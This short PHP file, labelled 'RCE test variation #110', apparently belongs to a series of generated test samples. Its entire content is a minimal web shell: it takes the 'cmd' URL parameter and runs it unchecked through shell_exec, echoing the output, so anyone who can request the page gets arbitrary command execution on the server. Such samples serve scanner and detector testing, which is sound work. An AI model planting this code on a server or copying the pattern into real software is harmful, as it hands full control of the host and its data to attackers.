<?php
// RCE test variation #110
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>